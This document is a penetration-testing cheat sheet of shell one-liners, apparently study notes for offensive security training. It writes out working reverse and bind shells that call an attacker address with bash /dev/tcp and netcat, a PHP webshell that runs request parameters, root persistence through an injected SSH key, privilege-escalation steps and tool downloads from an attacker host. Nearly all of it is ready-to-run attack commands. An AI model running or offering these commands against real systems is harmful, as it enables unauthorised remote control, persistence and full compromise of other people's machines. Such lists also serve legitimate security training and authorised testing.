### Using Shells

#### Send a reverse shell from the remote server
```Shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

#### Another command to send a reverse shell from the remote server
```Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

#### Start a bind shell on the remote server
```Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

#### Connect to a bind shell started on the remote server
```Shell
nc 10.10.10.1 1234
```

#### Upgrade shell TTY (1)
```Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Upgrade shell TTY (2)
`ctrl+z` then `stty raw -echo` then `fg` then `enter` twice

#### Create a webshell php file
```Shell
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

#### Execute a command on an uploaded webshell
```Shell
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

### Privilege Escalation

#### Run linpeas script to enumerate remote server
```Shell
./linpeas.sh
```

#### List available sudo privileges
```Shell
sudo -l
```

#### Run a command with sudo
```Shell
sudo -u user /bin/echo Hello World!
```
These types of commands can be found on GTFOBins

#### Switch to root user (if we have access to sudo su)
```Shell
sudo su -
```

#### Switch to a user (if we have access to sudo su)
```Shell
sudo su user -
```

#### Create a new SSH key
```Shell
ssh-keygen -f key
```

#### Add the generated public key to the user
```Shell
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

#### SSH to the server with the generated private key
```Shell
ssh root@10.10.10.10 -i key
```

### Transferring Files

#### Download a file on the remote server from our local machine
```Shell
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

#### Transfer a file to the remote server with scp (requires SSH access)
```Shell
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

#### Convert a file to base64
```Shell
base64 shell -w 0
```

#### Convert a file from base64 back to its original format
```Shell
echo f0VMR...SNIO...InmDwU | base64 -d > shell
```

#### Check the file's md5sum to ensure it converted correctly
```Shell
md5sum shell
```
